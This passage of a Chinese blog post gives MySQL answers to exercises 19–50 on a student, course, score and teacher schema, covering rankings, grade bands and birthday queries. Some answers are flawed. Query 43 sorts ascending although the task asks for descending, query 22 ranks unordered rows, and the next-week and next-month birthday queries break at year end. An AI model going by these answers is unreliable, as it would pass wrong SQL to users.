from (</span><br><span class="line">        select s_id,c_id,s_score from score WHERE c_id=&#x27;02&#x27; GROUP BY s_id,c_id,s_score ORDER BY s_score DESC</span><br><span class="line">)a,(select @k:=0,@i:=0,@score:=0)s</span><br><span class="line">    union</span><br><span class="line">    select a.s_id,a.c_id,</span><br><span class="line">        @i:=@i +1 as i,</span><br><span class="line">        @k:=(case when @score=a.s_score then @k else @i end) as rank,</span><br><span class="line">        @score:=a.s_score as score</span><br><span class="line">    from (</span><br><span class="line">        select s_id,c_id,s_score from score WHERE c_id=&#x27;03&#x27; GROUP BY s_id,c_id,s_score ORDER BY s_score DESC</span><br><span class="line">)a,(select @k:=0,@i:=0,@score:=0)s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 20、查询学生的总成绩并进行排名</span><br><span class="line">select a.s_id,</span><br><span class="line">    @i:=@i+1 as i,</span><br><span class="line">    @k:=(case when @score=a.sum_score then @k else @i end) as rank,</span><br><span class="line">    @score:=a.sum_score as score</span><br><span class="line">from (select s_id,SUM(s_score) as sum_score from score GROUP BY s_id ORDER BY sum_score DESC)a,</span><br><span class="line">    (select @k:=0,@i:=0,@score:=0)s</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">-- 21、查询不同老师所教不同课程平均分从高到低显示 </span><br><span class="line">    select a.t_id,c.t_name,a.c_id,ROUND(avg(s_score),2) as avg_score from course a</span><br><span class="line">        left join score b on a.c_id=b.c_id </span><br><span class="line">        left join teacher c on a.t_id=c.t_id</span><br><span class="line">        GROUP BY a.c_id,a.t_id,c.t_name ORDER BY avg_score DESC;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">-- 22、查询所有课程的成绩第2名到第3名的学生信息及该课程成绩</span><br><span class="line">            select d.*,c.排名,c.s_score,c.c_id from (</span><br><span class="line">                select a.s_id,a.s_score,a.c_id,@i:=@i+1 as 排名 from score a,(select @i:=0)s where a.c_id=&#x27;01&#x27;    </span><br><span class="line">            )c</span><br><span class="line">            left join student d on c.s_id=d.s_id</span><br><span class="line">            where 排名 BETWEEN 2 AND 3</span><br><span class="line">            UNION</span><br><span class="line">            select d.*,c.排名,c.s_score,c.c_id from (</span><br><span class="line">                select a.s_id,a.s_score,a.c_id,@j:=@j+1 as 排名 from score a,(select @j:=0)s where a.c_id=&#x27;02&#x27;    </span><br><span class="line">            )c</span><br><span class="line">            left join student d on c.s_id=d.s_id</span><br><span class="line">            where 排名 BETWEEN 2 AND 3</span><br><span class="line">            UNION</span><br><span class="line">            select d.*,c.排名,c.s_score,c.c_id from (</span><br><span class="line">                select a.s_id,a.s_score,a.c_id,@k:=@k+1 as 排名 from score a,(select @k:=0)s where a.c_id=&#x27;03&#x27;    </span><br><span class="line">            )c</span><br><span class="line">            left join student d on c.s_id=d.s_id</span><br><span class="line">            where 排名 BETWEEN 2 AND 3;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 23、统计各科成绩各分数段人数：课程编号,课程名称,[100-85],[85-70],[70-60],[0-60]及所占百分比</span><br><span class="line">        select distinct f.c_name,a.c_id,b.`85-100`,b.百分比,c.`70-85`,c.百分比,d.`60-70`,d.百分比,e.`0-60`,e.百分比 from score a</span><br><span class="line">                left join (select c_id,SUM(case when s_score &gt;85 and s_score &lt;=100 then 1 else 0 end) as `85-100`,</span><br><span class="line">                                            ROUND(100*(SUM(case when s_score &gt;85 and s_score &lt;=100 then 1 else 0 end)/count(*)),2) as 百分比</span><br><span class="line">                                from score GROUP BY c_id)b on a.c_id=b.c_id</span><br><span class="line">                left join (select c_id,SUM(case when s_score &gt;70 and s_score &lt;=85 then 1 else 0 end) as `70-85`,</span><br><span class="line">                                            ROUND(100*(SUM(case when s_score &gt;70 and s_score &lt;=85 then 1 else 0 end)/count(*)),2) as 百分比</span><br><span class="line">                                from score GROUP BY c_id)c on a.c_id=c.c_id</span><br><span class="line">                left join (select c_id,SUM(case when s_score &gt;60 and s_score &lt;=70 then 1 else 0 end) as `60-70`,</span><br><span class="line">                                            ROUND(100*(SUM(case when s_score &gt;60 and s_score &lt;=70 then 1 else 0 end)/count(*)),2) as 百分比</span><br><span class="line">                                from score GROUP BY c_id)d on a.c_id=d.c_id</span><br><span class="line">                left join (select c_id,SUM(case when s_score &gt;=0 and s_score &lt;=60 then 1 else 0 end) as `0-60`,</span><br><span class="line">                                            ROUND(100*(SUM(case when s_score &gt;=0 and s_score &lt;=60 then 1 else 0 end)/count(*)),2) as 百分比</span><br><span class="line">                                from score GROUP BY c_id)e on a.c_id=e.c_id</span><br><span class="line">                left join course f on a.c_id = f.c_id</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">-- 24、查询学生平均成绩及其名次 </span><br><span class="line">        select a.s_id,</span><br><span class="line">                @i:=@i+1 as &#x27;不保留空缺排名&#x27;,</span><br><span class="line">                @k:=(case when @avg_score=a.avg_s then @k else @i end) as &#x27;保留空缺排名&#x27;,</span><br><span class="line">                @avg_score:=avg_s as &#x27;平均分&#x27;</span><br><span class="line">        from (select s_id,ROUND(AVG(s_score),2) as avg_s from score GROUP BY s_id)a,(select @avg_score:=0,@i:=0,@k:=0)b;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">-- 25、查询各科成绩前三名的记录</span><br><span class="line">            -- 1.选出b表比a表成绩大的所有组</span><br><span class="line">            -- 2.选出比当前id成绩大的 小于三个的</span><br><span class="line">        select a.s_id,a.c_id,a.s_score from score a </span><br><span class="line">            left join score b on a.c_id = b.c_id and a.s_score&lt;b.s_score</span><br><span class="line">            group by a.s_id,a.c_id,a.s_score HAVING COUNT(b.s_id)&lt;3</span><br><span class="line">            ORDER BY a.c_id,a.s_score DESC</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 26、查询每门课程被选修的学生数 </span><br><span class="line">        select c_id,count(s_id) from score a GROUP BY c_id</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 27、查询出只有两门课程的全部学生的学号和姓名 </span><br><span class="line">        select s_id,s_name from student where s_id in(</span><br><span class="line">                select s_id from score GROUP BY s_id HAVING COUNT(c_id)=2);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 28、查询男生、女生人数 </span><br><span class="line">        select s_sex,COUNT(s_sex) as 人数  from student GROUP BY s_sex</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 29、查询名字中含有&quot;风&quot;字的学生信息</span><br><span class="line">        select * from student where s_name like &#x27;%风%&#x27;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 30、查询同名同性学生名单，并统计同名人数 </span><br><span class="line">        select a.s_name,a.s_sex,count(*) from student a  JOIN </span><br><span class="line">                    student b on a.s_id !=b.s_id and a.s_name = b.s_name and a.s_sex = b.s_sex</span><br><span class="line">        GROUP BY a.s_name,a.s_sex</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 31、查询1990年出生的学生名单</span><br><span class="line">        select s_name from student where s_birth like &#x27;1990%&#x27;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 32、查询每门课程的平均成绩，结果按平均成绩降序排列，平均成绩相同时，按课程编号升序排列 </span><br><span class="line">    select c_id,ROUND(AVG(s_score),2) as avg_score from score GROUP BY c_id ORDER BY avg_score DESC,c_id ASC</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 33、查询平均成绩大于等于85的所有学生的学号、姓名和平均成绩 </span><br><span class="line">    select a.s_id,b.s_name,ROUND(avg(a.s_score),2) as avg_score from score a</span><br><span class="line">        left join student b on a.s_id=b.s_id GROUP BY s_id HAVING avg_score&gt;=85</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 34、查询课程名称为&quot;数学&quot;，且分数低于60的学生姓名和分数 </span><br><span class="line">        select a.s_name,b.s_score from score b LEFT JOIN student a on a.s_id=b.s_id where b.c_id=(</span><br><span class="line">                    select c_id from course where c_name =&#x27;数学&#x27;) and b.s_score&lt;60</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 35、查询所有学生的课程及分数情况； </span><br><span class="line">        select a.s_id,a.s_name,</span><br><span class="line">                    SUM(case c.c_name when &#x27;语文&#x27; then b.s_score else 0 end) as &#x27;语文&#x27;,</span><br><span class="line">                    SUM(case c.c_name when &#x27;数学&#x27; then b.s_score else 0 end) as &#x27;数学&#x27;,</span><br><span class="line">                    SUM(case c.c_name when &#x27;英语&#x27; then b.s_score else 0 end) as &#x27;英语&#x27;,</span><br><span class="line">                    SUM(b.s_score) as  &#x27;总分&#x27;</span><br><span class="line">        from student a left join score b on a.s_id = b.s_id </span><br><span class="line">        left join course c on b.c_id = c.c_id </span><br><span class="line">        GROUP BY a.s_id,a.s_name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> -- 36、查询任何一门课程成绩在70分以上的姓名、课程名称和分数； </span><br><span class="line">            select a.s_name,b.c_name,c.s_score from course b left join score c on b.c_id = c.c_id</span><br><span class="line">                left join student a on a.s_id=c.s_id where c.s_score&gt;=70</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 37、查询不及格的课程</span><br><span class="line">        select a.s_id,a.c_id,b.c_name,a.s_score from score a left join course b on a.c_id = b.c_id</span><br><span class="line">            where a.s_score&lt;60 </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 38、查询课程编号为01且课程成绩在80分以上的学生的学号和姓名； </span><br><span class="line">        select a.s_id,b.s_name from score a LEFT JOIN student b on a.s_id = b.s_id</span><br><span class="line">            where a.c_id = &#x27;01&#x27; and a.s_score&gt;80</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 39、求每门课程的学生人数 </span><br><span class="line">        select count(*) from score GROUP BY c_id;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 40、查询选修&quot;张三&quot;老师所授课程的学生中，成绩最高的学生信息及其成绩</span><br><span class="line">        -- 查询老师id   </span><br><span class="line">        select c_id from course c,teacher d where c.t_id=d.t_id and d.t_name=&#x27;张三&#x27;</span><br><span class="line">        -- 查询最高分（可能有相同分数）</span><br><span class="line">        select MAX(s_score) from score where c_id=&#x27;02&#x27;</span><br><span class="line">        -- 查询信息</span><br><span class="line">        select a.*,b.s_score,b.c_id,c.c_name from student a</span><br><span class="line">            LEFT JOIN score b on a.s_id = b.s_id</span><br><span class="line">            LEFT JOIN course c on b.c_id=c.c_id</span><br><span class="line">            where b.c_id =(select c_id from course c,teacher d where c.t_id=d.t_id and d.t_name=&#x27;张三&#x27;)</span><br><span class="line">            and b.s_score in (select MAX(s_score) from score where c_id=&#x27;02&#x27;)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">-- 41、查询不同课程成绩相同的学生的学生编号、课程编号、学生成绩 </span><br><span class="line">    select DISTINCT b.s_id,b.c_id,b.s_score from score a,score b where a.c_id != b.c_id and a.s_score = b.s_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 42、查询每门功成绩最好的前两名 </span><br><span class="line">        -- 牛逼的写法</span><br><span class="line">    select a.s_id,a.c_id,a.s_score from score a</span><br><span class="line">        where (select COUNT(1) from score b where b.c_id=a.c_id and b.s_score&gt;=a.s_score)&lt;=2 ORDER BY a.c_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 43、统计每门课程的学生选修人数（超过5人的课程才统计）。要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列  </span><br><span class="line">        select c_id,count(*) as total from score GROUP BY c_id HAVING total&gt;5 ORDER BY total,c_id ASC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 44、检索至少选修两门课程的学生学号 </span><br><span class="line">        select s_id,count(*) as sel from score GROUP BY s_id HAVING sel&gt;=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 45、查询选修了全部课程的学生信息 </span><br><span class="line">        select * from student where s_id in(        </span><br><span class="line">            select s_id from score GROUP BY s_id HAVING count(*)=(select count(*) from course))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 46、查询各学生的年龄</span><br><span class="line">    -- 按照出生日期来算，当前月日 &lt; 出生年月的月日则，年龄减一</span><br><span class="line">    select s_birth,(DATE_FORMAT(NOW(),&#x27;%Y&#x27;)-DATE_FORMAT(s_birth,&#x27;%Y&#x27;) - </span><br><span class="line">                (case when DATE_FORMAT(NOW(),&#x27;%m%d&#x27;)&gt;DATE_FORMAT(s_birth,&#x27;%m%d&#x27;) then 0 else 1 end)) as age</span><br><span class="line">        from student;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 47、查询本周过生日的学生</span><br><span class="line">    select * from student where WEEK(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;))=WEEK(s_birth)</span><br><span class="line">    select * from student where YEARWEEK(s_birth)=YEARWEEK(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;))</span><br><span class="line">    select WEEK(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 48、查询下周过生日的学生</span><br><span class="line">    select * from student where WEEK(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;))+1 =WEEK(s_birth)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 49、查询本月过生日的学生</span><br><span class="line">    select * from student where MONTH(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;)) =MONTH(s_birth)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 50、查询下月过生日的学生</span><br><span class="line">    select * from student where MONTH(DATE_FORMAT(NOW(),&#x27;%Y%m%d&#x27;))+1 =MONTH(s_birth)</span><br></pre></td></tr></table></figure>





































































































]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
</search>
